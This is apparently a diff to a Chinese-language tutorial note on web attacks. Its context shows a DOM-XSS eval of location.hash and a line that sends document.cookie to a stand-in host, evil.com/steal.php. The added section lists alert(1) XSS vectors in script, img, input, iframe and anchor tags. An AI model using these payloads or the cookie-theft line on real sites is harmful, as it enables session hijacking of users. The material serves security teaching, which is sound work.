@@ -21,3 +21,12 @@ eval( location.hash.substr(1) ); // 获取#符号后面的内容
 然后加载图片，发起get请求"http://www.evil.com/steal.php?c="+escape(document.cookie)
 ````
 ### CSRF攻击
+### HTML内嵌脚本执行
+````javascript
+js脚本除了执行在JS格式的文件里，还可以出现在HTML的很多标签中，如下：
+<script>alert(1)</script>
+<img src=# onerror="alert(1)">
+<input type="text" value="x" onmouseover="alert(1)" />
+<iframe src="javascript:alert(1)"></iframe>
+<a href="javascript:alert(1)">x</a>
+````
